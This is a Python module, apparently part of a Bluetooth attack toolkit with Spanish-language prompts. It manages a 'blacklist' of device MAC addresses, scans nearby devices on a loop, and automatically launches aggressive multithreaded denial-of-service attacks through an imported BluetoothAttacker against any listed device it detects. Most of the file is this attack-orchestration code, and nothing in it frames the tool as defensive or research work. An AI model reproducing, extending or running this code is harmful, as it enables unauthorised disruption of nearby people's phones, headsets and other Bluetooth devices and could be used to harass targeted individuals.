import json
import logging
import os
import threading
import time
from typing import Dict, List, Optional

from bluetooth_attacker import BluetoothAttacker
from bluetooth_scanner import BluetoothScanner
from utils import get_palette

logger = logging.getLogger(__name__)

DEFAULT_BLACKLIST_FILE = "blacklist.json"
DEFAULT_WATCH_INTERVAL = 5
AGGRESSIVE_THREADS = 300
AGGRESSIVE_PACKET_SIZE = 60
AGGRESSIVE_DURATION = 300


class BlacklistManager:
    """
    Gestiona la lista negra y orquesta ataques DoS agresivos cuando
    se detectan dispositivos objetivo en las cercanías.
    """

    def __init__(
        self,
        adapter: str,
        blacklist_path: str = DEFAULT_BLACKLIST_FILE,
        watch_interval: int = DEFAULT_WATCH_INTERVAL,
    ) -> None:
        self.adapter = adapter
        self.blacklist_path = blacklist_path
        self.watch_interval = max(1, watch_interval)
        self.scanner = BluetoothScanner()
        self.blacklist: List[Dict[str, object]] = []
        self._attack_threads: Dict[str, threading.Thread] = {}
        self._lock = threading.Lock()
        self._consecutive_scan_failures = 0
        self.load_blacklist()

    # ------------------------------------------------------------------ #
    # Persistence helpers
    # ------------------------------------------------------------------ #
    @staticmethod
    def _normalize_entry(entry) -> Optional[Dict[str, object]]:
        if isinstance(entry, str):
            return {"mac": entry.upper(), "active": True}
        if isinstance(entry, dict):
            mac = entry.get("mac") or entry.get("target")
            if not mac:
                return None
            active = entry.get("active", True)
            return {"mac": str(mac).upper(), "active": bool(active)}
        return None

    def load_blacklist(self) -> None:
        if not os.path.exists(self.blacklist_path):
            self.blacklist = []
            logger.info("Blacklist file %s not found. A new one will be created.", self.blacklist_path)
            return

        try:
            with open(self.blacklist_path, "r", encoding="utf-8") as fh:
                data = json.load(fh)
        except (json.JSONDecodeError, OSError) as exc:
            print(f"[!] No se pudo leer {self.blacklist_path}: {exc}")
            logger.exception("Failed to read blacklist file %s", self.blacklist_path)
            self.blacklist = []
            return

        targets = data.get("targets", [])
        normalized: List[Dict[str, object]] = []
        for raw in targets:
            entry = self._normalize_entry(raw)
            if entry and entry not in normalized:
                normalized.append(entry)

        self.blacklist = normalized
        logger.info("Loaded %s entries into blacklist.", len(self.blacklist))

    def save_blacklist(self) -> None:
        try:
            with open(self.blacklist_path, "w", encoding="utf-8") as fh:
                json.dump({"targets": self.blacklist}, fh, indent=2, ensure_ascii=False)
            logger.info("Saved blacklist with %s entries.", len(self.blacklist))
        except OSError as exc:
            print(f"[!] No se pudo guardar la lista negra: {exc}")
            logger.exception("Failed to write blacklist file %s", self.blacklist_path)

    # ------------------------------------------------------------------ #
    # Interaction helpers
    # ------------------------------------------------------------------ #
    def _find_entry(self, mac: str) -> Optional[Dict[str, object]]:
        mac_upper = mac.upper()
        for entry in self.blacklist:
            if entry["mac"] == mac_upper:
                return entry
        return None

    def _active_entries(self) -> List[Dict[str, object]]:
        return [entry for entry in self.blacklist if entry.get("active", True)]

    def print_blacklist(self) -> None:
        if not self.blacklist:
            print("[-] La lista negra está vacía.")
            return

        palette = get_palette()
        print("[*] Dispositivos en la lista negra:")
        print("┌────┬─────────────────┬──────────┐")
        print("│ #  │ MAC             │ Estado   │")
        print("├────┼─────────────────┼──────────┤")
        for idx, entry in enumerate(self.blacklist, start=1):
            active = entry.get("active", True)
            status = "ACTIVO" if active else "PAUSADO"
            color = palette["success"] if active else palette["warning"]
            reset = palette["reset"]
            print(f"│ {idx:02d} │ {entry['mac']:<15} │ {color}{status:<8}{reset} │")
        print("└────┴─────────────────┴──────────┘")

    def add_mac(self, mac: str) -> None:
        mac = mac.strip().upper()
        if not mac:
            print("[!] Debes proporcionar una dirección MAC válida.")
            return

        existing = self._find_entry(mac)
        if existing:
            if not existing.get("active", True):
                existing["active"] = True
                self.save_blacklist()
                print(f"[+] {mac} reactivado en la lista negra.")
            else:
                print("[!] La dirección MAC ya se encuentra activa en la lista.")
            return

        self.blacklist.append({"mac": mac, "active": True})
        self.save_blacklist()
        print(f"[+] {mac} agregado a la lista negra.")

    def remove_mac(self, index: int) -> None:
        if 0 <= index < len(self.blacklist):
            entry = self.blacklist.pop(index)
            self.save_blacklist()
            print(f"[-] {entry['mac']} eliminado de la lista negra.")
        else:
            print("[!] Índice inválido.")

    def toggle_mac(self, index: int) -> None:
        if 0 <= index < len(self.blacklist):
            entry = self.blacklist[index]
            entry["active"] = not entry.get("active", True)
            state = "ACTIVADO" if entry["active"] else "PAUSADO"
            self.save_blacklist()
            print(f"[~] {entry['mac']} ahora está {state}.")
        else:
            print("[!] Índice inválido.")

    def interactive_scan_and_add(self) -> None:
        devices = self.scanner.scan(self.adapter)
        if not devices:
            print("[-] No se detectaron dispositivos en el escaneo.")
            return

        while True:
            choice = input("Selecciona el número del dispositivo a agregar (Enter para salir): ").strip()
            if not choice:
                break
            if not choice.isdigit():
                print("[!] Debes introducir un número válido.")
                continue
            idx = int(choice)
            mac = devices.get(idx)
            if not mac:
                print("[!] Número inválido. Inténtalo de nuevo.")
                continue
            confirmation = input(f"Confirma la MAC para agregar ({mac}) o escribe otra: ").strip()
            final_mac = confirmation.upper() if confirmation else mac.upper()
            self.add_mac(final_mac)

    def add_manual_mac(self) -> None:
        manual_mac = input("Ingresa la dirección MAC a agregar (formato AA:BB:CC:DD:EE:FF): ").strip().upper()
        if manual_mac:
            self.add_mac(manual_mac)

    def manage_blacklist_menu(self) -> None:
        while True:
            print("\n[*] Gestor de lista negra")
            self.print_blacklist()
            print("\nOpciones:")
            print("  [A] Agregar manualmente")
            print("  [R] Eliminar por número")
            print("  [T] Alternar estado (activo/pausado)")
            print("  [C] Limpiar lista")
            print("  [Q] Continuar")
            choice = input("Selecciona una opción: ").strip().lower()
            if choice == "a":
                self.add_manual_mac()
            elif choice == "r":
                if not self.blacklist:
                    print("[-] La lista está vacía.")
                    continue
                idx = input("Número a eliminar: ").strip()
                if idx.isdigit():
                    self.remove_mac(int(idx) - 1)
                else:
                    print("[!] Debes introducir un número.")
            elif choice == "t":
                if not self.blacklist:
                    print("[-] La lista está vacía.")
                    continue
                idx = input("Número a alternar: ").strip()
                if idx.isdigit():
                    self.toggle_mac(int(idx) - 1)
                else:
                    print("[!] Debes introducir un número.")
            elif choice == "c":
                confirm = input("¿Seguro que deseas vaciar la lista? (s/N): ").strip().lower()
                if confirm in {"s", "si", "y", "yes"}:
                    self.blacklist.clear()
                    self.save_blacklist()
                    print("[*] Lista negra vaciada.")
            elif choice == "q":
                break
            else:
                print("[!] Opción inválida.")

    def prompt_initial_actions(self) -> bool:
        """
        Returns True if the user wishes to start the attack, False otherwise.
        """
        print("[*] --- Módulo Black List ---")
        self.print_blacklist()

        if self._prompt_yes_no("¿Deseas realizar un escaneo de dispositivos cercanos?", default=True):
            self.interactive_scan_and_add()

        self.manage_blacklist_menu()

        active_entries = self._active_entries()
        if not active_entries:
            print("[-] No hay dispositivos activos en la lista negra. Agrega o activa alguno antes de iniciar.")
            return False

        start_choice = self._prompt_yes_no("¿Deseas iniciar el ataque Black List ahora?", default=True)
        return start_choice

    # ------------------------------------------------------------------ #
    # Attack loop
    # ------------------------------------------------------------------ #
    def watch_and_attack(self) -> None:
        """
        Monitors the area for MAC addresses in the blacklist and launches DoS attacks
        when they are detected.
        """
        print("[*] Iniciando modo vigilancia. Presiona Ctrl+C para detener.")
        print(f"[*] Escanearé cada {self.watch_interval} segundos buscando coincidencias.")

        try:
            while True:
                devices = self._perform_scan()
                if not devices:
                    time.sleep(self.watch_interval)
                    continue
                matches = self._matching_targets(devices)
                for entry in matches:
                    self._launch_attack(entry["mac"])
                time.sleep(self.watch_interval)
        except KeyboardInterrupt:
            print("\n[!] Modo vigilancia detenido por el usuario.")
            logger.info("Blacklist watch interrupted by user.")
        finally:
            with self._lock:
                self._attack_threads.clear()

    def _perform_scan(self) -> Dict[int, str]:
        print("[*] Escaneando dispositivos...")
        devices = self.scanner.scan(self.adapter)
        if devices:
            self._consecutive_scan_failures = 0
        else:
            self._consecutive_scan_failures += 1
            if self._consecutive_scan_failures % 5 == 0:
                logger.warning(
                    "No devices detected in the last %s scans while monitoring blacklist.",
                    self._consecutive_scan_failures,
                )
        logger.debug("Scan result: %s", devices)
        return devices or {}

    def _matching_targets(self, devices: Dict[int, str]) -> List[Dict[str, object]]:
        macs = set(devices.values())
        matches = [
            entry for entry in self._active_entries()
            if entry["mac"] in macs
        ]
        if matches:
            print("[*] Encontradas coincidencias con la lista negra:")
            for entry in matches:
                print(f"   -> {entry['mac']}")
            logger.info("Matching blacklist devices detected: %s", [entry["mac"] for entry in matches])
        return matches

    def _launch_attack(self, mac: str) -> None:
        with self._lock:
            thread = self._attack_threads.get(mac)
            if thread and thread.is_alive():
                logger.debug("Attack against %s already running; skipping new launch.", mac)
                return

            attack_thread = threading.Thread(
                target=self._attack_worker,
                args=(mac,),
                daemon=True,
                name=f"blacklist-attack-{mac.replace(':', '')}",
            )
            self._attack_threads[mac] = attack_thread

        attack_thread.start()

    def _attack_worker(self, mac: str) -> None:
        print(f"[*] Lanzando DoS invasivo contra {mac} (modo agresivo).")
        logger.info("Launching blacklist DoS attack against %s", mac)
        attacker = BluetoothAttacker(mac, self.adapter)
        try:
            attacker.dos_attack(
                threads_count=AGGRESSIVE_THREADS,
                package_size=AGGRESSIVE_PACKET_SIZE,
                duration=AGGRESSIVE_DURATION,
                mode="auto",
            )
        except Exception as exc:
            print(f"[!] Error durante el ataque a {mac}: {exc}")
            logger.exception("Error during blacklist attack for %s", mac)
        finally:
            print(f"[+] Ataque DoS a {mac} finalizado.")
            logger.info("Completed blacklist attack against %s", mac)
            with self._lock:
                self._attack_threads.pop(mac, None)

    # ------------------------------------------------------------------ #
    # Utility prompts
    # ------------------------------------------------------------------ #
    @staticmethod
    def _prompt_yes_no(prompt_text: str, default: bool = False) -> bool:
        suffix = "[S/n]" if default else "[s/N]"
        try:
            raw = input(f"{prompt_text} {suffix}: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return default
        if not raw:
            return default
        return raw in {"s", "si", "y", "yes"}

    # ------------------------------------------------------------------ #
    # Public entry point
    # ------------------------------------------------------------------ #
    def run(self) -> None:
        should_start = self.prompt_initial_actions()
        if not should_start:
            print("[*] Sesión de lista negra finalizada sin iniciar el ataque.")
            return

        if not self._active_entries():
            print("[!] No hay objetivos activos en la lista negra. Abortando.")
            return

        self.watch_and_attack()
